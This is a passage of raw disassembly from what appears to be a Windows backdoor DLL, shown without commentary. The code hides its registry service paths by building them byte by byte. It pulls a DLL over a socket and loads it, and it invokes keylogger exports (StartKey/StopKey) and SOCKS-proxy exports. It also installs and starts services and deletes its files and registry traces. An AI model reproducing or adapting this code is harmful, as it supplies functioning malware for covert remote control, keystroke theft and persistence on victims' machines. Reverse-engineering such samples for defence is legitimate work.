		push	eax		; LPSTR
		call	ebx ; wsprintfA
		push	3Fh
		xor	eax, eax
		pop	edx
		lea	edi, [ebp+var_5FF]
		mov	ecx, edx
		rep stosd
		stosw
		stosb
		mov	ecx, edx
		xor	eax, eax
		lea	edi, [ebp+var_2FF]
		and	[ebp+var_5F9], 0
		rep stosd
		stosw
		stosb
		mov	ecx, edx
		xor	eax, eax
		lea	edi, [ebp+var_3FF]
		and	[ebp+var_2EF], 0
		rep stosd
		stosw
		stosb
		and	[ebp+var_3F3], 0
		mov	ecx, edx
		xor	eax, eax
		lea	edi, [ebp+var_4FF]
		rep stosd
		stosw
		stosb
		mov	[ebp+var_600], 53h
		mov	[ebp+var_5FF], 59h
		mov	[ebp+var_5FE], 53h
		mov	[ebp+var_5FD], 54h
		mov	[ebp+var_5FC], 45h
		mov	[ebp+var_5FB], 4Dh
		mov	[ebp+var_5FA], 5Ch
		mov	[ebp+var_300], 43h
		mov	[ebp+var_2FF], 75h
		mov	[ebp+var_2FE], 72h
		mov	[ebp+var_2FD], 72h
		mov	[ebp+var_2FC], 65h
		mov	[ebp+var_2FB], 6Eh
		mov	[ebp+var_2FA], 74h
		mov	[ebp+var_2F9], 43h
		mov	[ebp+var_2F8], 6Fh
		mov	[ebp+var_2F7], 6Eh
		mov	[ebp+var_2F6], 74h
		mov	[ebp+var_2F5], 72h
		mov	[ebp+var_2F4], 6Fh
		mov	[ebp+var_2F3], 6Ch
		mov	[ebp+var_2F2], 53h
		mov	[ebp+var_2F1], 65h
		mov	[ebp+var_2F0], 74h
		mov	[ebp+var_400], 43h
		mov	[ebp+var_3FF], 6Fh
		mov	[ebp+var_3FE], 6Eh
		mov	[ebp+var_3FD], 74h
		mov	[ebp+var_3FC], 72h
		mov	[ebp+var_3FB], 6Fh
		mov	[ebp+var_3FA], 6Ch
		mov	[ebp+var_3F9], 53h
		mov	[ebp+var_3F8], 65h
		mov	[ebp+var_3F7], 74h
		mov	[ebp+var_3F6], 30h
		mov	[ebp+var_3F5], 30h
		mov	[ebp+var_3F4], 31h
		mov	[ebp+var_500], 5Ch
		and	[ebp+SubKey], 0
		push	40h
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_803]
		and	[ebp+var_4F6], 0
		rep stosd
		stosw
		push	esi		; lpValueName
		mov	[ebp+var_4FF], 53h
		mov	[ebp+var_4FE], 65h
		mov	[ebp+var_4FD], 72h
		mov	[ebp+var_4FC], 76h
		mov	[ebp+var_4FB], 69h
		mov	[ebp+var_4FA], 63h
		mov	[ebp+var_4F9], 65h
		mov	[ebp+var_4F8], 73h
		mov	[ebp+var_4F7], 5Ch
		stosb
		call	sub_10001E55
		add	esp, 10h
		xor	eax, eax
		lea	edi, [ebp+var_1FF]
		push	3Fh
		pop	ecx
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+var_500]
		push	esi
		push	eax
		lea	eax, [ebp+var_300]
		push	eax
		lea	eax, [ebp+var_600]
		and	[ebp+var_1ED], 0
		push	eax
		lea	eax, [ebp+var_200]
		mov	[ebp+var_200], 25h
		push	eax		; LPCSTR
		lea	eax, [ebp+SubKey]
		push	eax		; LPSTR
		mov	[ebp+var_1FF], 73h
		mov	[ebp+var_1FE], 25h
		mov	[ebp+var_1FD], 73h
		mov	[ebp+var_1FC], 25h
		mov	[ebp+var_1FB], 73h
		mov	[ebp+var_1FA], 25h
		mov	[ebp+var_1F9], 73h
		mov	[ebp+var_1F8], 5Ch
		mov	[ebp+var_1F7], 50h
		mov	[ebp+var_1F6], 61h
		mov	[ebp+var_1F5], 72h
		mov	[ebp+var_1F4], 61h
		mov	[ebp+var_1F3], 6Dh
		mov	[ebp+var_1F2], 65h
		mov	[ebp+var_1F1], 74h
		mov	[ebp+var_1F0], 65h
		mov	[ebp+var_1EF], 72h
		mov	[ebp+var_1EE], 73h
		call	ebx ; wsprintfA
		lea	eax, [ebp+String]
		push	eax		; lpString2
		lea	eax, [ebp+SubKey]
		push	eax		; lpSubKey
		call	sub_10001D65
		add	esp, 20h
		lea	eax, [ebp+var_500]
		push	esi
		push	eax
		lea	eax, [ebp+var_400]
		push	eax
		lea	eax, [ebp+var_600]
		push	eax
		lea	eax, [ebp+var_200]
		push	eax		; LPCSTR
		lea	eax, [ebp+SubKey]
		push	eax		; LPSTR
		call	ebx ; wsprintfA
		lea	eax, [ebp+String]
		push	eax		; lpString2
		lea	eax, [ebp+SubKey]
		push	eax		; lpSubKey
		call	sub_10001D65
		add	esp, 20h
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_1000205E	endp


; =============== S U B	R O U T	I N E =======================================


sub_100025A4	proc near		; CODE XREF: sub_10003182+67p
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	edi, 100h
		xor	ebx, ebx
		push	edi		; Size
		lea	eax, [esi+8]
		push	ebx		; Val
		push	eax		; Dst
		mov	dword ptr [esi], offset	off_10004134
		mov	[esi+4], ebx
		call	memset
		push	edi		; Size
		lea	eax, [esi+10Ch]
		push	ebx		; Val
		push	eax		; Dst
		call	memset
		push	edi		; Size
		lea	eax, [esi+20Ch]
		push	ebx		; Val
		push	eax		; Dst
		call	memset
		push	edi		; Size
		lea	eax, [esi+30Ch]
		push	ebx		; Val
		push	eax		; Dst
		call	memset
		add	esp, 30h
		mov	[esi+108h], ebx
		mov	eax, esi
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_100025A4	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_100025FD(void *, char)
sub_100025FD	proc near		; DATA XREF: .rdata:off_10004134o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	sub_10002619
		test	[esp+4+arg_0], 1
		jz	short loc_10002613
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_10002613:				; CODE XREF: sub_100025FD+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_100025FD	endp


; =============== S U B	R O U T	I N E =======================================


sub_10002619	proc near		; CODE XREF: sub_100025FD+3p
					; sub_10003182+84p ...
		mov	dword ptr [ecx], offset	off_10004134
		retn
sub_10002619	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_10002620(LPCSTR lpFileName,	int)
sub_10002620	proc near		; CODE XREF: .text:10002778p
					; sub_1000296A+68p

var_158		= byte ptr -158h
var_4C		= byte ptr -4Ch
var_3F		= byte ptr -3Fh
var_3E		= byte ptr -3Eh
var_3D		= byte ptr -3Dh
var_3C		= byte ptr -3Ch
len		= byte ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
lpFileName	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset loc_10003507
		call	__EH_prolog
		sub	esp, 14Ch
		push	esi
		lea	ecx, [ebp+var_158]
		call	sub_10001355
		push	[ebp+arg_4]
		and	[ebp+var_4], 0
		lea	ecx, [ebp+var_158]
		call	sub_100017BB
		test	eax, eax
		jnz	short loc_10002659

loc_10002652:				; CODE XREF: sub_10002620+50j
					; sub_10002620+B7j
		xor	esi, esi
		jmp	loc_100026ED
; ---------------------------------------------------------------------------

loc_10002659:				; CODE XREF: sub_10002620+30j
		and	dword ptr [ebp+len], 0
		lea	eax, [ebp+len]
		push	4		; len
		push	eax		; buf
		lea	ecx, [ebp+var_158]
		call	sub_1000270D
		test	eax, eax
		jz	short loc_10002652
		mov	eax, dword ptr [ebp+len]
		add	eax, 0FFFFh
		push	eax		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	esi, eax
		mov	eax, dword ptr [ebp+len]
		add	eax, 0FFFFh
		push	eax		; Size
		push	0		; Val
		push	esi		; Dst
		call	memset
		add	esp, 10h
		lea	ecx, [ebp+var_158]
		push	dword ptr [ebp+len] ; len
		push	esi		; buf
		call	sub_1000270D
		test	eax, eax
		jnz	short loc_100026AC
		push	esi
		jmp	short loc_100026D1
; ---------------------------------------------------------------------------

loc_100026AC:				; CODE XREF: sub_10002620+87j
		mov	[ebp+var_3E], 8
		mov	[ebp+var_3F], 8
		mov	[ebp+var_3D], 4
		mov	[ebp+var_3C], 2
		push	[ebp+lpFileName] ; lpFileName
		lea	ecx, [ebp+var_4C]
		mov	byte ptr [ebp+var_4], 1
		push	esi		; lpBuffer
		call	sub_100012C4
		test	eax, eax
		push	esi		; void *
		jnz	short loc_100026DC

loc_100026D1:				; CODE XREF: sub_10002620+8Aj
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		jmp	loc_10002652
; ---------------------------------------------------------------------------

loc_100026DC:				; CODE XREF: sub_10002620+AFj
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		push	[ebp+lpFileName] ; lpLibFileName
		call	ds:LoadLibraryA
		mov	esi, eax

loc_100026ED:				; CODE XREF: sub_10002620+34j
		or	[ebp+var_4], 0FFFFFFFFh
		lea	ecx, [ebp+var_158]
		call	sub_1000139C
		mov	ecx, [ebp+var_C]
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		leave
		retn	8
sub_10002620	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_1000270D(char *buf,	int len)
sub_1000270D	proc near		; CODE XREF: sub_10002620+49p
					; sub_10002620+80p

buf		= dword	ptr  8
len		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+len]
		push	esi
		push	edi
		mov	edi, [ebp+buf]
		and	[ebp+buf], 0
		mov	esi, ecx
		cmp	dword ptr [esi+4], 0
		jz	short loc_10002753
		test	ebx, ebx
		jbe	short loc_10002749

loc_10002729:				; CODE XREF: sub_1000270D+3Aj
		push	0		; flags
		push	ebx		; len
		push	edi		; buf
		push	dword ptr [esi+4] ; s
		call	ds:recv
		test	eax, eax
		jle	short loc_10002753
		add	[ebp+buf], eax
		add	edi, eax
		sub	ebx, eax
		mov	eax, [ebp+buf]
		cmp	eax, [ebp+len]
		jb	short loc_10002729

loc_10002749:				; CODE XREF: sub_1000270D+1Aj
		push	1
		pop	eax

loc_1000274C:				; CODE XREF: sub_1000270D+48j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	8
; ---------------------------------------------------------------------------

loc_10002753:				; CODE XREF: sub_1000270D+16j
					; sub_1000270D+2Bj
		xor	eax, eax
		jmp	short loc_1000274C
sub_1000270D	endp

; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------

loc_10002758:				; CODE XREF: .text:100027C2j
		push	ebx
		mov	ebx, ecx
		push	esi
		push	edi
		lea	edi, [ebx+10Ch]
		push	edi
		call	ds:LoadLibraryA
		mov	esi, eax
		test	esi, esi
		jnz	short loc_10002791

loc_10002770:				; CODE XREF: .text:1000278Fj
		push	1F45h
		push	edi
		mov	ecx, ebx
		call	sub_10002620
		mov	esi, eax
		test	esi, esi
		jnz	short loc_10002791
		push	dwMilliseconds
		call	ds:Sleep
		jmp	short loc_10002770
; ---------------------------------------------------------------------------

loc_10002791:				; CODE XREF: .text:1000276Ej
					; .text:10002781j
		push	offset aStartkey ; "StartKey"
		push	esi
		call	ds:GetProcAddress
		test	eax, eax
		jz	short loc_100027AC
		call	eax
		push	esi
		call	ds:FreeLibrary
		jmp	short loc_100027BA
; ---------------------------------------------------------------------------

loc_100027AC:				; CODE XREF: .text:1000279Fj
		push	esi
		call	ds:FreeLibrary
		push	edi
		call	ds:DeleteFileA

loc_100027BA:				; CODE XREF: .text:100027AAj
		pop	edi
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_100027BE:				; DATA XREF: sub_1000296A+39o
		mov	ecx, [esp+4]
		jmp	loc_10002758
; ---------------------------------------------------------------------------

loc_100027C7:				; CODE XREF: .text:1000280Cj
		push	esi
		push	edi
		lea	edi, [ecx+30Ch]
		push	edi
		call	ds:LoadLibraryA
		mov	esi, eax
		test	esi, esi
		jz	short loc_10002805
		push	offset aStartsocks ; "StartSocks"
		push	esi
		call	ds:GetProcAddress
		test	eax, eax
		jz	short loc_100027F7
		call	eax
		push	esi
		call	ds:FreeLibrary
		jmp	short loc_10002805
; ---------------------------------------------------------------------------

loc_100027F7:				; CODE XREF: .text:100027EAj
		push	esi
		call	ds:FreeLibrary
		push	edi
		call	ds:DeleteFileA

loc_10002805:				; CODE XREF: .text:100027DAj
					; .text:100027F5j
		pop	edi
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_10002808:				; DATA XREF: sub_1000296A+45o
		mov	ecx, [esp+4]
		jmp	loc_100027C7
; ---------------------------------------------------------------------------

loc_10002811:				; DATA XREF: sub_1000296A+25o
		mov	ecx, [esp+4]
		jmp	loc_10002F54

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1000281A	proc near		; CODE XREF: sub_1000296A+103p

FileName	= byte ptr -100h
var_FF		= byte ptr -0FFh

		push	ebp
		mov	ebp, esp
		sub	esp, 100h
		cmp	dword_1000516C,	0
		jbe	locret_100028C9
		push	esi
		lea	esi, [ecx+10Ch]
		push	edi
		push	esi		; lpLibFileName
		call	ds:LoadLibraryA
		mov	edi, eax
		test	edi, edi
		jz	short loc_1000285E
		push	offset ProcName	; "StopKey"
		push	edi		; hModule
		call	ds:GetProcAddress
		test	eax, eax
		jz	short loc_10002857
		call	eax

loc_10002857:				; CODE XREF: sub_1000281A+39j
		push	edi		; hLibModule
		call	ds:FreeLibrary

loc_1000285E:				; CODE XREF: sub_1000281A+29j
		push	esi		; lpFileName
		mov	esi, ds:DeleteFileA
		call	esi ; DeleteFileA
		and	[ebp+FileName],	0
		push	3Fh
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_FF]
		push	0FFh		; nSize
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+FileName]
		push	eax		; lpFilename
		push	hModule		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+FileName]
		push	5Ch		; Ch
		push	eax		; Str
		call	ds:strrchr
		and	byte ptr [eax],	0
		pop	ecx
		pop	ecx
		push	offset ValueName
		push	offset aSzt_txt	; "\\%szt.txt"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	esi ; DeleteFileA
		pop	edi
		pop	esi

locret_100028C9:			; CODE XREF: sub_1000281A+10j
		leave
		retn
sub_1000281A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_100028CB	proc near		; CODE XREF: sub_1000296A+10Ap

FileName	= byte ptr -100h
var_FF		= byte ptr -0FFh

		push	ebp
		mov	ebp, esp
		sub	esp, 100h
		push	esi
		add	ecx, 30Ch
		push	edi
		push	ecx		; lpLibFileName
		call	ds:LoadLibraryA
		mov	esi, eax
		test	esi, esi
		jz	short loc_10002902
		push	offset aStopsocks ; "StopSocks"
		push	esi		; hModule
		call	ds:GetProcAddress
		test	eax, eax
		jz	short loc_100028FB
		call	eax

loc_100028FB:				; CODE XREF: sub_100028CB+2Cj
		push	esi		; hLibModule
		call	ds:FreeLibrary

loc_10002902:				; CODE XREF: sub_100028CB+1Cj
		and	[ebp+FileName],	0
		push	3Fh
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_FF]
		push	0FFh		; nSize
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+FileName]
		push	eax		; lpFilename
		push	hModule		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+FileName]
		push	5Ch		; Ch
		push	eax		; Str
		call	ds:strrchr
		and	byte ptr [eax],	0
		pop	ecx
		pop	ecx
		push	offset ValueName
		push	offset aSza_txt	; "\\%sza.txt"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	ds:DeleteFileA
		pop	edi
		pop	esi
		leave
		retn
sub_100028CB	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1000296A	proc near		; CODE XREF: sub_10003182+75p

FileName	= byte ptr -208h
var_207		= byte ptr -207h
Buffer		= byte ptr -108h
var_107		= byte ptr -107h
var_8		= dword	ptr -8
hKey		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 208h
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		call	sub_10002B23
		mov	esi, ds:_beginthread
		xor	edi, edi
		cmp	dword_10005558,	edi
		jz	short loc_10002999
		push	ebx
		push	edi
		push	offset loc_10002811
		call	esi ; _beginthread
		add	esp, 0Ch

loc_10002999:				; CODE XREF: sub_1000296A+21j
		cmp	dword_1000516C,	edi
		jbe	short loc_100029AD
		push	ebx
		push	edi
		push	offset loc_100027BE
		call	esi ; _beginthread
		add	esp, 0Ch

loc_100029AD:				; CODE XREF: sub_1000296A+35j
		push	ebx
		push	edi
		push	offset loc_10002808
		call	esi ; _beginthread
		add	esp, 0Ch
		lea	esi, [ebx+8]
		push	esi		; lpLibFileName
		call	ds:LoadLibraryA
		cmp	eax, edi
		mov	[ebx+4], eax
		jnz	short loc_100029EF

loc_100029CA:				; CODE XREF: sub_1000296A+83j
		push	1F3Fh		; int
		push	esi		; lpFileName
		mov	ecx, ebx
		call	sub_10002620
		cmp	eax, edi
		mov	[ebx+4], eax
		jnz	short loc_100029EA
		push	dwMilliseconds	; dwMilliseconds
		call	ds:Sleep

loc_100029EA:				; CODE XREF: sub_1000296A+72j
		cmp	[ebx+4], edi
		jz	short loc_100029CA

loc_100029EF:				; CODE XREF: sub_1000296A+5Ej
		mov	[ebp+var_8], edi

loc_100029F2:				; CODE XREF: sub_1000296A+D0j
		push	offset aVip0715	; "Vip0715"
		push	dword ptr [ebx+4] ; hModule
		call	ds:GetProcAddress
		cmp	eax, edi
		jz	short loc_10002A20
		lea	ecx, [ebp+var_8]
		mov	esi, offset dword_10005160
		push	ecx
		mov	ecx, 145h
		sub	esp, 514h
		mov	edi, esp
		rep movsd
		call	eax
		xor	edi, edi

loc_10002A20:				; CODE XREF: sub_1000296A+98j
		cmp	[ebp+var_8], 3000h
		jz	short loc_10002A44
		cmp	[ebp+var_8], 3001h
		jnz	short loc_10002A3C
		push	0FFFFFFFFh	; dwMilliseconds

loc_10002A34:				; CODE XREF: sub_1000296A+D8j
		call	ds:Sleep
		jmp	short loc_100029F2
; ---------------------------------------------------------------------------

loc_10002A3C:				; CODE XREF: sub_1000296A+C6j
		push	dwMilliseconds
		jmp	short loc_10002A34
; ---------------------------------------------------------------------------

loc_10002A44:				; CODE XREF: sub_1000296A+BDj
		push	dword ptr [ebx+4] ; hLibModule
		call	ds:FreeLibrary
		mov	esi, ds:DeleteFileA
		lea	eax, [ebx+8]
		push	eax		; lpFileName
		call	esi ; DeleteFileA
		push	offset ValueName ; lpServiceName
		call	sub_10001D19
		pop	ecx
		mov	ecx, ebx
		call	sub_10002F2D
		mov	ecx, ebx
		call	sub_1000281A
		mov	ecx, ebx
		call	sub_100028CB
		and	[ebp+FileName],	0
		push	3Fh
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_207]
		and	[ebp+Buffer], 0
		rep stosd
		stosw
		stosb
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_107]
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		push	0C8h		; nBufferLength
		call	ds:GetTempPathA
		push	dword_10005180
		lea	eax, [ebp+Buffer]
		push	eax
		lea	eax, [ebp+FileName]
		push	offset aS08x_ini ; "%s\\%08x.ini"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 10h
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	esi ; DeleteFileA
		and	[ebp+hKey], 0
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	0F003Fh		; samDesired
		push	0		; ulOptions
		push	offset SubKey	; "SOFTWARE\\Microsoft\\Windows	NT\\CurrentVe"...
		push	80000002h	; hKey
		call	ds:RegOpenKeyExA
		test	eax, eax
		jnz	short loc_10002B1E
		push	offset ValueName ; lpValueName
		push	[ebp+hKey]	; hKey
		call	ds:RegDeleteValueA
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey

loc_10002B1E:				; CODE XREF: sub_1000296A+19Bj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_1000296A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10002B23	proc near		; CODE XREF: sub_1000296A+Ep

var_208		= byte ptr -208h
var_207		= byte ptr -207h
var_206		= byte ptr -206h
var_205		= byte ptr -205h
var_204		= byte ptr -204h
Source		= byte ptr -108h
var_107		= byte ptr -107h
var_106		= byte ptr -106h
var_105		= byte ptr -105h
var_104		= byte ptr -104h
var_103		= byte ptr -103h
var_102		= byte ptr -102h
Str		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 208h
		push	ebx
		push	esi
		push	edi
		mov	edx, ecx
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_107]
		rep stosd
		stosw
		stosb
		mov	esi, ds:GetModuleFileNameA
		and	[ebp+var_103], 0
		mov	edi, 0C8h
		lea	ebx, [edx+8]
		push	edi		; nSize
		push	ebx		; lpFilename
		push	hModule		; hModule
		mov	[ebp+var_4], edx
		mov	[ebp+Source], 7Ah
		mov	[ebp+var_107], 2Eh
		mov	[ebp+var_106], 64h
		mov	[ebp+var_105], 6Ch
		mov	[ebp+var_104], 6Ch
		call	esi ; GetModuleFileNameA
		push	2Eh		; Ch
		push	ebx		; Str
		mov	ebx, ds:strrchr
		call	ebx ; strrchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_10002BA9
		and	byte ptr [eax],	0
		lea	ecx, [ebp+Source]
		push	ecx		; Source
		push	eax		; Dest
		call	strcat
		pop	ecx
		pop	ecx

loc_10002BA9:				; CODE XREF: sub_10002B23+72j
		mov	eax, [ebp+var_4]
		and	[ebp+var_102], 0
		add	eax, 10Ch
		push	edi		; nSize
		push	eax		; lpFilename
		mov	[ebp+Source], 7Ah
		push	hModule		; hModule
		mov	[ebp+var_107], 74h
		mov	[ebp+var_106], 2Eh
		mov	[ebp+var_105], 64h
		mov	[ebp+var_104], 6Ch
		mov	[ebp+var_103], 6Ch
		call	esi ; GetModuleFileNameA
		mov	eax, [ebp+var_4]
		push	2Eh		; Ch
		add	eax, 10Ch
		push	eax		; Str
		call	ebx ; strrchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_10002C11
		and	byte ptr [eax],	0
		lea	ecx, [ebp+Source]
		push	ecx		; Source
		push	eax		; Dest
		call	strcat
		pop	ecx
		pop	ecx

loc_10002C11:				; CODE XREF: sub_10002B23+DAj
		mov	eax, [ebp+var_4]
		and	[ebp+var_102], 0
		add	eax, 30Ch
		push	edi		; nSize
		push	eax		; lpFilename
		mov	[ebp+Source], 7Ah
		push	hModule		; hModule
		mov	[ebp+var_107], 61h
		mov	[ebp+var_106], 2Eh
		mov	[ebp+var_105], 64h
		mov	[ebp+var_104], 6Ch
		mov	[ebp+var_103], 6Ch
		mov	[ebp+Str], eax
		call	esi ; GetModuleFileNameA
		push	2Eh		; Ch
		push	[ebp+Str]	; Str
		call	ebx ; strrchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_10002C76
		and	byte ptr [eax],	0
		lea	ecx, [ebp+Source]
		push	ecx		; Source
		push	eax		; Dest
		call	strcat
		pop	ecx
		pop	ecx

loc_10002C76:				; CODE XREF: sub_10002B23+13Fj
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_207]
		rep stosd
		stosw
		stosb
		mov	eax, [ebp+var_4]
		and	[ebp+var_204], 0
		push	0C8h		; nSize
		mov	[ebp+var_208], 2Eh
		lea	edi, [eax+20Ch]
		mov	[ebp+var_207], 73h
		push	edi		; lpFilename
		mov	[ebp+var_206], 79h
		push	hModule		; hModule
		mov	[ebp+var_205], 73h
		call	esi ; GetModuleFileNameA
		push	2Eh		; Ch
		push	edi		; Str
		call	ebx ; strrchr
		pop	ecx
		pop	ecx
		pop	edi
		pop	esi
		pop	ebx
		test	eax, eax
		jz	short locret_10002CDD
		lea	ecx, [ebp+var_208]
		push	ecx		; Source
		push	eax		; Dest
		call	strcat
		pop	ecx
		pop	ecx

locret_10002CDD:			; CODE XREF: sub_10002B23+1A9j
		leave
		retn
sub_10002B23	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_10002CDF(SC_HANDLE hSCManager, LPCSTR lpDisplayName, LPCSTR	lpBinaryPathName)
sub_10002CDF	proc near		; CODE XREF: sub_10002EB0+21p

hSCManager	= dword	ptr  4
lpDisplayName	= dword	ptr  8
lpBinaryPathName= dword	ptr  0Ch

		push	esi
		xor	esi, esi
		push	esi		; lpPassword
		push	esi		; lpServiceStartName
		push	esi		; lpDependencies
		push	esi		; lpdwTagId
		push	esi		; lpLoadOrderGroup
		push	[esp+18h+lpBinaryPathName] ; lpBinaryPathName
		push	1		; dwErrorControl
		push	2		; dwStartType
		push	1		; dwServiceType
		push	0F01FFh		; dwDesiredAccess
		push	[esp+2Ch+lpDisplayName]	; lpDisplayName
		push	[esp+30h+lpDisplayName]	; lpServiceName
		push	[esp+34h+hSCManager] ; hSCManager
		call	ds:CreateServiceA
		cmp	eax, esi
		pop	esi
		jnz	short loc_10002D11
		xor	eax, eax
		jmp	short locret_10002D1B
; ---------------------------------------------------------------------------

loc_10002D11:				; CODE XREF: sub_10002CDF+2Cj
		push	eax		; hSCObject
		call	ds:CloseServiceHandle
		push	1
		pop	eax

locret_10002D1B:			; CODE XREF: sub_10002CDF+30j
		retn	0Ch
sub_10002CDF	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_10002D1E(SC_HANDLE hSCManager, LPCSTR lpServiceName)
sub_10002D1E	proc near		; CODE XREF: sub_10002EB0+2Cp

hSCManager	= dword	ptr  4
lpServiceName	= dword	ptr  8

		push	esi
		push	0F01FFh		; dwDesiredAccess
		push	[esp+8+lpServiceName] ;	lpServiceName
		push	[esp+0Ch+hSCManager] ; hSCManager
		call	ds:OpenServiceA
		mov	esi, eax
		test	esi, esi
		jz	short loc_10002D50
		push	edi
		push	0		; lpServiceArgVectors
		push	0		; dwNumServiceArgs
		push	esi		; hService
		call	ds:StartServiceA
		push	esi		; hSCObject
		mov	edi, eax
		call	ds:CloseServiceHandle
		mov	eax, edi
		pop	edi

loc_10002D50:				; CODE XREF: sub_10002D1E+18j
		pop	esi
		retn	8
sub_10002D1E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10002D54	proc near		; CODE XREF: sub_10002EB0+39p

var_140		= byte ptr -140h
var_13F		= byte ptr -13Fh
var_13E		= byte ptr -13Eh
var_13D		= byte ptr -13Dh
var_13C		= byte ptr -13Ch
var_13B		= byte ptr -13Bh
var_13A		= byte ptr -13Ah
FileName	= byte ptr -40h
var_3F		= byte ptr -3Fh
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 140h
		push	ebx
		push	edi
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_13F]
		rep stosd
		stosw
		stosb
		push	0Fh
		xor	ebx, ebx
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_3F]
		mov	[ebp+FileName],	bl
		rep stosd
		push	[ebp+arg_0]
		mov	[ebp+var_140], 5Ch
		stosw
		stosb
		lea	eax, [ebp+var_140]
		mov	[ebp+var_13F], 5Ch
		push	eax		; LPCSTR
		lea	eax, [ebp+FileName]
		push	eax		; LPSTR
		mov	[ebp+var_13E], 2Eh
		mov	[ebp+var_13D], 5Ch
		mov	[ebp+var_13C], 25h
		mov	[ebp+var_13B], 73h
		mov	[ebp+var_13A], bl
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+FileName]
		push	ebx		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	ebx		; lpSecurityAttributes
		push	ebx		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		push	eax		; lpFileName
		call	ds:CreateFileA
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_10002DEA
		xor	eax, eax
		jmp	short loc_10002DFF
; ---------------------------------------------------------------------------

loc_10002DEA:				; CODE XREF: sub_10002D54+90j
		mov	ecx, [ebp+arg_4]
		cmp	ecx, ebx
		jz	short loc_10002DF5
		mov	[ecx], eax
		jmp	short loc_10002DFC
; ---------------------------------------------------------------------------

loc_10002DF5:				; CODE XREF: sub_10002D54+9Bj
		push	eax		; hObject
		call	ds:CloseHandle

loc_10002DFC:				; CODE XREF: sub_10002D54+9Fj
		push	1
		pop	eax

loc_10002DFF:				; CODE XREF: sub_10002D54+94j
		pop	edi
		pop	ebx
		leave
		retn	8
sub_10002D54	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_10002E05(SC_HANDLE hSCManager, LPCSTR lpServiceName)
sub_10002E05	proc near		; CODE XREF: sub_10002E74+1Cp

ServiceStatus	= _SERVICE_STATUS ptr -1Ch
hSCManager	= dword	ptr  8
lpServiceName	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		push	esi
		push	0F01FFh		; dwDesiredAccess
		push	[ebp+lpServiceName] ; lpServiceName
		push	[ebp+hSCManager] ; hSCManager
		call	ds:OpenServiceA
		mov	esi, eax
		test	esi, esi
		jz	short loc_10002E3D
		lea	eax, [ebp+ServiceStatus]
		push	edi
		push	eax		; lpServiceStatus
		push	1		; dwControl
		push	esi		; hService
